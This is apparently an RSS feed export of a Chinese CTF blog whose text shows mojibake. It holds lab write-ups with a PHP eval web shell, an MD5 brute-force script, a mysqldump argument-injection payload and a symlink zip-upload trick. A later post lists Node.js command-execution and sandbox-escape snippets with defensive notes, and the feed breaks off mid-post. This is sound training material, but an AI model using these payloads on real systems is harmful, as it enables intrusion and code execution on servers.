rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;index.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;h1&gt;403 Forbidden&lt;/h1&gt;</span><br><span class="line">        &lt;p&gt;You are not authorized to access this resource.&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;If you think this is a mistake, please contact the website administrator.&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">flag&#123;b0f38231-f0d4-4144-ad49-f82d4b684a76&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="iæ˜¥ç§‹é¶åœº" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="ssrf" scheme="http://example.com/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>é—ç•™çš„å‹ç¼©åŒ…</title>
    <link href="http://example.com/2025/03/29/web/ichunqiu/%E9%81%97%E7%95%99%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/"/>
    <id>http://example.com/2025/03/29/web/ichunqiu/%E9%81%97%E7%95%99%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/</id>
    <published>2025-03-29T22:34:52.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>é¢˜ç›®ä¸­æœ‰å‹ç¼©åŒ…ï¼Œè€ƒè™‘åˆ°<a class="link"   href="http://www.zip/" >www.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>è®¿é—®<a class="link"   href="http://www.zipå‘ç°å±…ç„¶çœŸçš„æœ‰/" >www.zipå‘ç°å±…ç„¶çœŸçš„æœ‰ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>1337.php</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># leet</span><br><span class="line">if(md5($_GET[&#x27;pwd&#x27;])==&#x27;217f81b8ff0a1ab138a8e1bdc031262e&#x27;)&#123;</span><br><span class="line">   eval($_POST[&#x27;1337&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æ˜æ˜¾æ˜¯md5ç¢°æ’<br>çŒœæµ‹pwdå¤æ‚åº¦ä¸é«˜<br>æˆ³ä¸ªpyè„šæœ¬</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">def find_md5(target_hash, max_length=4):</span><br><span class="line">    chars = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span><br><span class="line">    </span><br><span class="line">    def calculate_md5(text):</span><br><span class="line">        return hashlib.md5(text.encode()).hexdigest()</span><br><span class="line">    </span><br><span class="line">    for length in range(1, max_length + 1):</span><br><span class="line">        for guess in product(chars, repeat=length):</span><br><span class="line">            candidate = &#x27;&#x27;.join(guess)</span><br><span class="line">            if calculate_md5(candidate) == target_hash:</span><br><span class="line">                return candidate</span><br><span class="line">            </span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">target = &#x27;217f81b8ff0a1ab138a8e1bdc031262e&#x27;</span><br><span class="line">result = find_md5(target)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure></div><p>çˆ†å‡ºæ¥leet<br>ç„¶åå°±æ˜¯å‘½ä»¤æ‰§è¡Œäº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="iæ˜¥ç§‹é¶åœº" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="å‘½ä»¤æ‰§è¡Œ" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="hash" scheme="http://example.com/tags/hash/"/>
    
  </entry>
  
  <entry>
    <title>dumpit</title>
    <link href="http://example.com/2025/03/27/web/ichunqiu/dumpit/"/>
    <id>http://example.com/2025/03/27/web/ichunqiu/dumpit/</id>
    <published>2025-03-27T17:10:52.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>æ‰«äº†ä¸€éï¼Œæ²¡ä¸œè¥¿.<br>é¢˜ç›®æ˜¯è¿™ä¸ªç©æ„</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use ?db=&amp;table_2_query= or ?db=&amp;table_2_dump= to view the tables! etc:?db=ctf&amp;table_2_query=flag1</span><br></pre></td></tr></table></figure></div><p>éšä¾¿æŒ‰ç…§ä¸Šé¢çš„æç¤ºè¿›è¡Œè¾“å…¥</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_query=flag1</span><br></pre></td></tr></table></figure></div><p>å°è¯•sqlå‘ç°æ²¡æœ‰æ³¨å…¥<br>ç„¶åæˆ‘ä¸ä¼šäº†</p><p>æŸ¥åˆ°<br>?db&#x3D;&amp;table_2_dump&#x3D; ä¼°è®¡è°ƒâ½¤çš„æ˜¯ mysqldump ä¹‹ç±»çš„å‘½ä»¤, å­˜åœ¨å‘½ä»¤æ³¨â¼Š<br>â€“result-file  filenameå¯ä»¥ç”¨æ¥æŒ‡å®šç”Ÿæˆæ–‡ä»¶</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?db=&quot;&lt;?=phpinfo()?&gt;&quot; --result-file shell.php&amp;table_2_dump=flag1</span><br></pre></td></tr></table></figure></div><p>åœ¨phpinfoé‡Œé¢æ‰¾åˆ°flagå³å¯</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="iæ˜¥ç§‹é¶åœº" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="å‘½ä»¤æ‰§è¡Œ" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>unzip</title>
    <link href="http://example.com/2025/03/27/web/ichunqiu/unzip/"/>
    <id>http://example.com/2025/03/27/web/ichunqiu/unzip/</id>
    <published>2025-03-27T16:51:52.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>æœ‰ä¸ªupload.php</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line">  error_reporting(0); </span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line"></span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE); </span><br><span class="line"></span><br><span class="line">if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;)&#123;  </span><br><span class="line">    //è¿™é‡Œæ˜¯éªŒè¯MIMEå€¼ï¼Œç¡®å®šä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ä¸ºzipï¼ŒåŒæ—¶ä¹Ÿä¸ºæˆ‘ä»¬æŒ‡æ˜äº†æ–¹å‘ï¼Œè¦ä¸Šä¼ ä¸€ä¸ªzipå‹ç¼©åŒ…ã€‚</span><br><span class="line">    </span><br><span class="line">    exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]); </span><br><span class="line">  //è¿™é‡Œçš„æ„æ€æ˜¯è¿›å…¥/tmpç›®å½•ä¸‹ï¼Œç„¶åè°ƒç”¨unzipå‘½ä»¤å¯¹å‹ç¼©åŒ…è¿›è¡Œè§£å‹ï¼Œä¹Ÿå°±æ˜¯æŠŠå‹ç¼©åŒ…è§£å‹åˆ°/tmpç›®å½•ä¸‹ã€‚  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//only this! </span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>è¦ä¼ ğŸï¼Œä½†æ˜¯è·¯å¾„æ˜¯&#x2F;tmp<br>è€ƒè™‘è½¯è¿æ¥</p><p>è¦åˆ›å»ºè½¯é“¾æ¥ï¼Œå¯ä»¥ä½¿ç”¨ln -så‘½ä»¤ï¼Œå…¶åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s [æºæ–‡ä»¶æˆ–ç›®å½•] [ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½•]</span><br></pre></td></tr></table></figure></div><p>æ³¨æ„ï¼šåœ¨æŒ‡å®šæºæ–‡ä»¶æˆ–ç›®å½•å’Œç›®æ ‡æ–‡ä»¶æˆ–ç›®å½•æ—¶ï¼Œä¸è¦åœ¨è·¯å¾„åé¢åŠ ä¸Šæ–œæ (&#x2F;)ã€‚ä¾‹å¦‚ï¼Œè¦åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæŒ‡å‘&#x2F;var&#x2F;www&#x2F;testç›®å½•çš„è½¯é“¾æ¥testï¼Œå¯ä»¥æ‰§è¡Œï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /var/www/test test</span><br></pre></td></tr></table></figure></div><p>å¦‚æœè¦åœ¨&#x2F;varç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæŒ‡å‘&#x2F;var&#x2F;www&#x2F;testçš„è½¯é“¾æ¥testï¼Œåˆ™æ‰§è¡Œï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /var/www/test /var/test</span><br></pre></td></tr></table></figure></div><p>äºæ˜¯,æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæŒ‡å‘&#x2F;www&#x2F;html&#x2F;çš„è½¯è¿æ¥&#x2F;tmp&#x2F;test</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /var/www/html /tmp/test</span><br></pre></td></tr></table></figure></div><p>å‹ç¼©ä¸ºzipä¼ ä¸Šå»</p><p>ğŸmama.php</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[a]);?&gt;</span><br></pre></td></tr></table></figure></div><p>è·¯å¾„ä¸º&#x2F;test&#x2F;mama.phpå‹ç¼©ä¸ºzip</p><p>è®¿é—®mama.phpå¼€å§‹æ‰¾flag<br>flagåœ¨&#x2F;flagä¸‹</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="iæ˜¥ç§‹é¶åœº" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="upload" scheme="http://example.com/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>nodejsæ‰§è¡Œå‘½ä»¤</title>
    <link href="http://example.com/2025/03/24/web/nodejs/nodejs/"/>
    <id>http://example.com/2025/03/24/web/nodejs/nodejs/</id>
    <published>2025-03-24T20:49:52.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ä»¥ä¸‹æ˜¯ <strong>Node.js ä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å„ç§æ–¹æ³•</strong> çš„è¯¦ç»†ä»‹ç»ï¼ŒåŒ…æ‹¬é€‚ç”¨åœºæ™¯ã€å®ç°æ–¹å¼å’Œå®‰å…¨æ³¨æ„äº‹é¡¹ï¼š</p><hr><h2 id="1-child-process-execï¼ˆæ ‡å‡†æ–¹å¼ï¼‰"><a href="#1-child-process-execï¼ˆæ ‡å‡†æ–¹å¼ï¼‰" class="headerlink" title="1. child_process.execï¼ˆæ ‡å‡†æ–¹å¼ï¼‰"></a><strong>1. <code>child_process.exec</code>ï¼ˆæ ‡å‡†æ–¹å¼ï¼‰</strong></h2><h3 id="é€‚ç”¨åœºæ™¯"><a href="#é€‚ç”¨åœºæ™¯" class="headerlink" title="é€‚ç”¨åœºæ™¯"></a><strong>é€‚ç”¨åœºæ™¯</strong></h3><ul><li>å¸¸è§„ Node.js ç¯å¢ƒä¸‹æ‰§è¡Œ Shell å‘½ä»¤ã€‚</li><li>é€‚ç”¨äºéœ€è¦è·å–å‘½ä»¤è¾“å‡ºæˆ–é”™è¯¯ä¿¡æ¯çš„åœºæ™¯ã€‚</li></ul><h3 id="ä»£ç ç¤ºä¾‹"><a href="#ä»£ç ç¤ºä¾‹" class="headerlink" title="ä»£ç ç¤ºä¾‹"></a><strong>ä»£ç ç¤ºä¾‹</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="title function_">exec</span>(<span class="string">&#x27;ls -la&#x27;</span>, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (error) <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error: <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">  <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Output: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><h3 id="ç‰¹ç‚¹"><a href="#ç‰¹ç‚¹" class="headerlink" title="ç‰¹ç‚¹"></a><strong>ç‰¹ç‚¹</strong></h3><p>âœ… <strong>æ ‡å‡†æ–¹æ³•</strong>ï¼Œå®˜æ–¹æ¨èã€‚<br>âœ… å¯ä»¥è·å–å‘½ä»¤çš„ <strong>å®Œæ•´è¾“å‡º</strong>ï¼ˆ<code>stdout</code>&#x2F;<code>stderr</code>ï¼‰ã€‚<br>âŒ å¦‚æœç”¨æˆ·è¾“å…¥æœªè¿‡æ»¤ï¼Œå¯èƒ½å¯¼è‡´ <strong>å‘½ä»¤æ³¨å…¥ï¼ˆRCEï¼‰</strong>ã€‚  </p><h3 id="é˜²å¾¡æªæ–½"><a href="#é˜²å¾¡æªæ–½" class="headerlink" title="é˜²å¾¡æªæ–½"></a><strong>é˜²å¾¡æªæ–½</strong></h3><ul><li>ä½¿ç”¨ <code>execFile</code>ï¼ˆé¿å… Shell è§£æï¼‰ï¼š<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">execFile</span>(<span class="string">&#x27;ls&#x27;</span>, [<span class="string">&#x27;-la&#x27;</span>], <span class="function">(<span class="params">error, stdout</span>) =&gt;</span> &#123; ... &#125;);</span><br></pre></td></tr></table></figure></div></li><li>å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œ <strong>ä¸¥æ ¼è¿‡æ»¤</strong>ï¼ˆå¦‚ç™½åå•æ ¡éªŒï¼‰ã€‚</li></ul><hr><h2 id="2-process-mainModule-constructor-loadï¼ˆç»•è¿‡-require-é™åˆ¶ï¼‰"><a href="#2-process-mainModule-constructor-loadï¼ˆç»•è¿‡-require-é™åˆ¶ï¼‰" class="headerlink" title="2. process.mainModule.constructor._loadï¼ˆç»•è¿‡ require é™åˆ¶ï¼‰"></a><strong>2. <code>process.mainModule.constructor._load</code>ï¼ˆç»•è¿‡ <code>require</code> é™åˆ¶ï¼‰</strong></h2><h3 id="é€‚ç”¨åœºæ™¯-1"><a href="#é€‚ç”¨åœºæ™¯-1" class="headerlink" title="é€‚ç”¨åœºæ™¯"></a><strong>é€‚ç”¨åœºæ™¯</strong></h3><ul><li>æŸäº›ç¯å¢ƒç¦ç”¨ <code>require</code>ï¼Œä½†ä»éœ€åŠ¨æ€åŠ è½½æ¨¡å—ï¼ˆå¦‚æ²™ç®±é€ƒé€¸ï¼‰ã€‚</li></ul><h3 id="ä»£ç ç¤ºä¾‹-1"><a href="#ä»£ç ç¤ºä¾‹-1" class="headerlink" title="ä»£ç ç¤ºä¾‹"></a><strong>ä»£ç ç¤ºä¾‹</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> childProcess = <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">childProcess.<span class="title function_">exec</span>(<span class="string">&#x27;æ¶æ„å‘½ä»¤&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="ç‰¹ç‚¹-1"><a href="#ç‰¹ç‚¹-1" class="headerlink" title="ç‰¹ç‚¹"></a><strong>ç‰¹ç‚¹</strong></h3><p>âœ… å¯ä»¥ç»•è¿‡éƒ¨åˆ† <strong><code>require</code> é™åˆ¶</strong>ã€‚<br>âŒ ä¾èµ– <code>global.process</code> çš„è®¿é—®æƒé™ã€‚<br>âŒ <strong>å®¹æ˜“è¢«å®‰å…¨å·¥å…·æ£€æµ‹</strong>ï¼ˆå¦‚ WAFï¼‰ã€‚  </p><h3 id="é˜²å¾¡æªæ–½-1"><a href="#é˜²å¾¡æªæ–½-1" class="headerlink" title="é˜²å¾¡æªæ–½"></a><strong>é˜²å¾¡æªæ–½</strong></h3><ul><li>ç¦æ­¢ä¿®æ”¹ <code>global.process</code>ï¼š<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="variable language_">global</span>.<span class="property">process</span>);</span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="3-vm-æ²™ç®±é€ƒé€¸ï¼ˆåˆ©ç”¨æ¼æ´æ‰§è¡Œå‘½ä»¤ï¼‰"><a href="#3-vm-æ²™ç®±é€ƒé€¸ï¼ˆåˆ©ç”¨æ¼æ´æ‰§è¡Œå‘½ä»¤ï¼‰" class="headerlink" title="3. vm æ²™ç®±é€ƒé€¸ï¼ˆåˆ©ç”¨æ¼æ´æ‰§è¡Œå‘½ä»¤ï¼‰"></a><strong>3. <code>vm</code> æ²™ç®±é€ƒé€¸ï¼ˆåˆ©ç”¨æ¼æ´æ‰§è¡Œå‘½ä»¤ï¼‰</strong></h2><h3 id="é€‚ç”¨åœºæ™¯-2"><a href="#é€‚ç”¨åœºæ™¯-2" class="headerlink" title="é€‚ç”¨åœºæ™¯"></a><strong>é€‚ç”¨åœºæ™¯</strong></h3><ul><li>å½“ä»£ç è¿è¡Œåœ¨ <code>vm</code> æ²™ç®±ä¸­ï¼Œä½†æ²™ç®±é…ç½®ä¸ä¸¥æ ¼æ—¶ã€‚</li></ul><h3 id="ä»£ç ç¤ºä¾‹-2"><a href="#ä»£ç ç¤ºä¾‹-2" class="headerlink" title="ä»£ç ç¤ºä¾‹"></a><strong>ä»£ç ç¤ºä¾‹</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">`</span></span><br><span class="line"><span class="string">  this.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).exec(&#x27;æ¶æ„å‘½ä»¤&#x27;);</span></span><br><span class="line"><span class="string">`</span>);</span><br><span class="line">script.<span class="title function_">runInNewContext</span>(&#123;&#125;);</span><br></pre></td></tr></table></figure></div><h3 id="ç‰¹ç‚¹-2"><a href="#ç‰¹ç‚¹-2" class="headerlink" title="ç‰¹ç‚¹"></a><strong>ç‰¹ç‚¹</strong></h3><p>âœ… å¯ç»•è¿‡ç®€å•æ²™ç®±é™åˆ¶ã€‚<br>âŒ ä¾èµ– <strong>æ²™ç®±é…ç½®é”™è¯¯</strong>ï¼ˆå¦‚æœªéš”ç¦»åŸå‹é“¾ï¼‰ã€‚<br>âŒ é«˜ç‰ˆæœ¬ Node.js å·²ä¿®å¤éƒ¨åˆ†æ¼æ´ã€‚  </p><h3 id="é˜²å¾¡æªæ–½-2"><a href="#é˜²å¾¡æªæ–½-2" class="headerlink" title="é˜²å¾¡æªæ–½"></a><strong>é˜²å¾¡æªæ–½</strong></h3><ul><li>ä½¿ç”¨æ›´å®‰å…¨çš„æ²™ç®±ï¼ˆå¦‚ <a href="https://github.com/patriksimek/vm2"><code>vm2</code></a>ï¼‰ã€‚</li><li>ç¦æ­¢è®¿é—® <code>constructor</code>ï¼š<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">vm.<span class="title function_">runInNewContext</span>(<span class="string">&#x27;ä»£ç &#x27;</span>, &#123;&#125;, &#123; <span class="attr">timeout</span>: <span class="number">1000</span> &#125;);</span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="4-process-bindingï¼ˆåº•å±‚-APIï¼‰"><a href="#4-process-bindingï¼ˆåº•å±‚-APIï¼‰" class="headerlink" title="4. process.bindingï¼ˆåº•å±‚ APIï¼‰"></a><strong>4. <code>process.binding</code>ï¼ˆåº•å±‚ APIï¼‰</strong></h2><h3 id="é€‚ç”¨åœºæ™¯-3"><a href="#é€‚ç”¨åœºæ™¯-3" class="headerlink" title="é€‚ç”¨åœºæ™¯"></a><strong>é€‚ç”¨åœºæ™¯</strong></h3><ul><li>éœ€è¦ç›´æ¥è°ƒç”¨ Node.js åº•å±‚ C++ ç»‘å®šï¼ˆå¦‚ <code>spawn_sync</code>ï¼‰ã€‚</li></ul><h3 id="ä»£ç ç¤ºä¾‹-3"><a href="#ä»£ç ç¤ºä¾‹-3" class="headerlink" title="ä»£ç ç¤ºä¾‹"></a><strong>ä»£ç ç¤ºä¾‹</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">process.<span class="title function_">binding</span>(<span class="string">&#x27;spawn_sync&#x27;</span>).<span class="title function_">spawn</span>(&#123;</span><br><span class="line">  <span class="attr">file</span>: <span class="string">&#x27;bash&#x27;</span>,</span><br><span class="line">  <span class="attr">args</span>: [<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;æ¶æ„å‘½ä»¤&#x27;</span>],</span><br><span class="line">  <span class="attr">stdio</span>: [<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;pipe&#x27;</span>]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><h3 id="ç‰¹ç‚¹-3"><a href="#ç‰¹ç‚¹-3" class="headerlink" title="ç‰¹ç‚¹"></a><strong>ç‰¹ç‚¹</strong></h3><p>âœ… ç»•è¿‡ <code>child_process</code> æ¨¡å—é™åˆ¶ã€‚<br>âŒ <strong>ä¾èµ– Node.js ç‰ˆæœ¬</strong>ï¼ˆæ–°ç‰ˆå¯èƒ½ç§»é™¤è¯¥ APIï¼‰ã€‚<br>âŒ éœ€è¦è¿›ç¨‹æƒé™ã€‚  </p><h3 id="é˜²å¾¡æªæ–½-3"><a href="#é˜²å¾¡æªæ–½-3" class="headerlink" title="é˜²å¾¡æªæ–½"></a><strong>é˜²å¾¡æªæ–½</strong></h3><ul><li>é™åˆ¶ <code>process.binding</code> è®¿é—®ï¼š<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> process.<span class="property">binding</span>;</span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="5-Worker-Threadsï¼ˆå¤šçº¿ç¨‹æ‰§è¡Œï¼‰"><a href="#5-Worker-Threadsï¼ˆå¤šçº¿ç¨‹æ‰§è¡Œï¼‰" class="headerlink" title="5. Worker Threadsï¼ˆå¤šçº¿ç¨‹æ‰§è¡Œï¼‰"></a><strong>5. <code>Worker Threads</code>ï¼ˆå¤šçº¿ç¨‹æ‰§è¡Œï¼‰</strong></h2><h3 id="é€‚ç”¨åœºæ™¯-4"><a href="#é€‚ç”¨åœºæ™¯-4" class="headerlink" title="é€‚ç”¨åœºæ™¯"></a><strong>é€‚ç”¨åœºæ™¯</strong></h3><ul><li>åœ¨ Worker çº¿ç¨‹ä¸­éšè—æ¶æ„ä»£ç ã€‚</li></ul><h3 id="ä»£ç ç¤ºä¾‹-4"><a href="#ä»£ç ç¤ºä¾‹-4" class="headerlink" title="ä»£ç ç¤ºä¾‹"></a><strong>ä»£ç ç¤ºä¾‹</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Worker</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;worker_threads&#x27;</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Worker</span>(<span class="string">`</span></span><br><span class="line"><span class="string">  const &#123; exec &#125; = require(&#x27;child_process&#x27;);</span></span><br><span class="line"><span class="string">  exec(&#x27;æ¶æ„å‘½ä»¤&#x27;);</span></span><br><span class="line"><span class="string">`</span>, &#123; <span class="attr">eval</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure></div><h3 id="ç‰¹ç‚¹-4"><a href="#ç‰¹ç‚¹-4" class="headerlink" title="ç‰¹ç‚¹"></a><strong>ç‰¹ç‚¹</strong></h3><p>âœ… å¯ç»•è¿‡ä¸»çº¿ç¨‹ç›‘æ§ã€‚<br>âŒ éœ€è¦å¯ç”¨ <code>eval: true</code>ã€‚<br>âŒ å¯èƒ½è¢« <strong>è¿›ç¨‹ç›‘æ§å·¥å…·</strong> å‘ç°ã€‚  </p><h3 id="é˜²å¾¡æªæ–½-4"><a href="#é˜²å¾¡æªæ–½-4" class="headerlink" title="é˜²å¾¡æªæ–½"></a><strong>é˜²å¾¡æªæ–½</strong></h3><ul><li>ç¦æ­¢åŠ¨æ€ Worker ä»£ç ï¼š<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Worker</span>(<span class="string">&#x27;file.js&#x27;</span>); <span class="comment">// åªå…è®¸æ–‡ä»¶åŠ è½½</span></span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="6-fs-execï¼ˆå†™å…¥è„šæœ¬åæ‰§è¡Œï¼‰"><a href="#6-fs-execï¼ˆå†™å…¥è„šæœ¬åæ‰§è¡Œï¼‰" class="headerlink" title="6. fs + execï¼ˆå†™å…¥è„šæœ¬åæ‰§è¡Œï¼‰"></a><strong>6. <code>fs + exec</code>ï¼ˆå†™å…¥è„šæœ¬åæ‰§è¡Œï¼‰</strong></h2><h3 id="é€‚ç”¨åœºæ™¯-5"><a href="#é€‚ç”¨åœºæ™¯-5" class="headerlink" title="é€‚ç”¨åœºæ™¯"></a><strong>é€‚ç”¨åœºæ™¯</strong></h3><ul><li>å½“ç›´æ¥æ‰§è¡Œå‘½ä»¤è¢«æ‹¦æˆªï¼Œä½†å…è®¸å†™å…¥æ–‡ä»¶æ—¶ã€‚</li></ul><h3 id="ä»£ç ç¤ºä¾‹-5"><a href="#ä»£ç 